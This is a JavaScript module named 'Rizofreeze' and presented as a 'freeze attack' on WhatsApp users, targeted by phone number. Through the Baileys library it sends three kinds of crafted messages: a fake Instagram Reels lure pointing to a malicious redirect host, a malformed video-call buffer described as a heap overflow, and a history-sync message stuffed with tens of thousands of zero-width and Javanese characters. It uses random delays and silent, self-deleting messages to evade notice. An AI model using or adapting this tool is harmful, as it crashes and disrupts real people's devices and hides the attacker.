// lib/rizofreeze.js
// RIZOFREEZE — number-only freeze attack (2026 CVEs)
// CVE-2026-23866 + Video Call Overflow + CVE-2026-48063

const crypto = require('crypto');
const {
    generateWAMessageFromContent,
    proto
} = require('@whiskeysockets/baileys');

const CONFIG = {
    JITTER_BASE_MS: 10000,
    JITTER_SPREAD: 0.6,
    VECTOR_GAP_MS: 30000,

    // vectors — number only
    VEC_REELS: true,          // CVE-2026-23866
    VEC_VIDEO: true,          // video call heap overflow
    VEC_SYNC: true,           // CVE-2026-48063

    // bot safety
    SILENT: true,
    EPHEMERAL: true,
    EPHEMERAL_SECONDS: 30,
    HEALTH_CHECK: true,
    ERROR_STOP: 0.3,

    FAKE_IG_CDN: 'scontent.cdninstagram.com',
    MALICIOUS_URL: 'https://evil.example.com/redirect',
    LOOP_COUNT: 3
};

const ZW_CHAR = "\u200b";
const JAVA_CHAR = "\uA9BE";

function jitter(base) {
    const spread = base * CONFIG.JITTER_SPREAD;
    return base + (Math.random() * 2 - 1) * spread;
}

function pickTitle() {
    const t = [
        'Check this reel', 'You have to see this', 'Wait for it',
        'This is crazy', 'Look at this', 'Thought you would like this'
    ];
    return t[Math.floor(Math.random() * t.length)];
}

function pickFakeId() {
    return crypto.randomBytes(11).toString('base64url').slice(0, 11);
}

function safeContext(extra = {}) {
    return {
        silent: CONFIG.SILENT,
        expiration: CONFIG.EPHEMERAL ? CONFIG.EPHEMERAL_SECONDS : 0,
        ephemeralSettingTimestamp: CONFIG.EPHEMERAL ? Date.now() : 0,
        ...extra
    };
}

async function checkBotHealth(sock) {
    try {
        if (!sock || !sock.user) return { ok: false, reason: 'socket_dead' };
        if (!sock.user.id) return { ok: false, reason: 'no_user' };
        if (sock.ws && sock.ws.readyState !== 1) return { ok: false, reason: 'ws_closed' };
        return { ok: true };
    } catch (err) {
        return { ok: false, reason: err.message };
    }
}

// ═══════════════════════════════════════════
//  VECTOR 1 — CVE-2026-23866 (Reels rich media)
// ═══════════════════════════════════════════
async function vecReels(sock, targetJid, onProgress, state) {
    let sent = 0;
    if (!CONFIG.VEC_REELS) return sent;

    for (let i = 0; i < CONFIG.LOOP_COUNT; i++) {
        if (state.errorRate > CONFIG.ERROR_STOP) break;

        const reelId = pickFakeId();
        const maliciousUrl = `${CONFIG.MALICIOUS_URL}/reel/${reelId}`;

        try {
            const msg = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
                interactiveMessage: {
                    body: { text: pickTitle() },
                    footer: { text: '' },
                    header: {
                        title: '',
                        hasMediaAttachment: true,
                        externalAdReply: {
                            title: pickTitle(),
                            body: 'Instagram Reels',
                            mediaType: 1,
                            thumbnailUrl: `https://${CONFIG.FAKE_IG_CDN}/p/${reelId}/thumb.jpg`,
                            sourceUrl: maliciousUrl,
                            mediaUrl: maliciousUrl,
                            renderLargerThumbnail: true,
                            showAdAttribution: false
                        }
                    },
                    contextInfo: safeContext(),
                    nativeFlowMessage: {
                        buttons: [{
                            name: 'galaxy_message',
                            buttonParamsJson: JSON.stringify({
                                'screen_1_TextInput_0': 'opt',
                                'flow_token': 'AQAAAAACS5FpgQ_cAAAAAE0QI3s.'
                            }),
                            version: 3
                        }]
                    }
                }
            }), { userJid: targetJid });

            await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
            sent++; state.success++;
            if (onProgress) onProgress(state.success, state.total, 'reels');
        } catch (err) {
            state.errors++;
            console.error('[rizofreeze] reels err:', err.message);
        }

        await new Promise(r => setTimeout(r, jitter(CONFIG.JITTER_BASE_MS)));
    }
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 2 — VIDEO CALL HEAP OVERFLOW
// ═══════════════════════════════════════════
async function vecVideoCall(sock, targetJid, onProgress, state) {
    let sent = 0;
    if (!CONFIG.VEC_VIDEO) return sent;

    try {
        const callId = crypto.randomBytes(16).toString('hex');

        const msg = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
            call: {
                callKey: Buffer.from(callId, 'hex'),
                videoData: Buffer.alloc(4096, 0xff),
                callType: 'video'
            }
        }), { userJid: targetJid });

        await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        sent++; state.success++;
        if (onProgress) onProgress(state.success, state.total, 'video');
    } catch (err) {
        state.errors++;
        console.error('[rizofreeze] video err:', err.message);
    }

    await new Promise(r => setTimeout(r, jitter(CONFIG.JITTER_BASE_MS)));
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 3 — CVE-2026-48063 (App State Corruption)
// ═══════════════════════════════════════════
async function vecAppState(sock, targetJid, onProgress, state) {
    let sent = 0;
    if (!CONFIG.VEC_SYNC) return sent;

    try {
        const fakeKey = crypto.randomBytes(32);
        const fakeSha = crypto.randomBytes(32);

        const payload = {
            protocolMessage: {
                type: 5,
                historySyncNotification: {
                    fileSha256: fakeSha,
                    fileLength: 65536,
                    mediaKey: fakeKey,
                    directPath: `${CONFIG.MALICIOUS_URL}/sync/fake`,
                    syncType: 2,
                    chunkOrder: 1,
                    placeholderResendMessage: {
                        messageKey: {
                            remoteJid: targetJid,
                            fromMe: false,
                            id: crypto.randomBytes(16).toString('hex')
                        },
                        message: {
                            conversation: ZW_CHAR.repeat(50000) + JAVA_CHAR.repeat(5000)
                        }
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(targetJid,
            proto.Message.fromObject(payload),
            { userJid: targetJid }
        );

        await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        sent++; state.success++;
        if (onProgress) onProgress(state.success, state.total, 'sync');
    } catch (err) {
        state.errors++;
        console.error('[rizofreeze] sync err:', err.message);
    }

    await new Promise(r => setTimeout(r, jitter(CONFIG.JITTER_BASE_MS)));
    return sent;
}

// ═══════════════════════════════════════════
//  MAIN — RIZOFREEZE (number only)
// ═══════════════════════════════════════════
async function Rizofreeze(sock, targetNumber, mode, onProgress) {
    // validate — number only, no @g.us
    const cleanNum = String(targetNumber).replace(/[^0-9]/g, '');
    if (!cleanNum || cleanNum.length < 10) {
        return { ok: false, error: 'invalid number' };
    }
    const targetJid = cleanNum + '@s.whatsapp.net';

    if (CONFIG.HEALTH_CHECK) {
        const h = await checkBotHealth(sock);
        if (!h.ok) return { ok: false, error: `health: ${h.reason}` };
    }

    const state = { success: 0, errors: 0, errorRate: 0, total: 9 };
    const vectors = [];

    const updateErr = () => {
        const t = state.success + state.errors;
        state.errorRate = t > 0 ? state.errors / t : 0;
    };

    const run = async (name, fn) => {
        try {
            const s = await fn();
            updateErr();
            if (s > 0) vectors.push(name);
        } catch (err) {
            console.error(`[rizofreeze] ${name} fatal:`, err.message);
            state.errors++; updateErr();
        }
    };

    if (mode === 'reels' || mode === 'all') {
        await run('reels', () => vecReels(sock, targetJid, onProgress, state));
        if (mode === 'all') await new Promise(r => setTimeout(r, jitter(CONFIG.VECTOR_GAP_MS)));
    }

    if (mode === 'video' || mode === 'all') {
        await run('video', () => vecVideoCall(sock, targetJid, onProgress, state));
        if (mode === 'all') await new Promise(r => setTimeout(r, jitter(CONFIG.VECTOR_GAP_MS)));
    }

    if (mode === 'sync' || mode === 'all') {
        await run('sync', () => vecAppState(sock, targetJid, onProgress, state));
    }

    return {
        ok: state.success > 0,
        sent: state.success,
        errors: state.errors,
        errorRate: state.errorRate.toFixed(2),
        vectors,
        number: cleanNum
    };
}

module.exports = { Rizofreeze, CONFIG };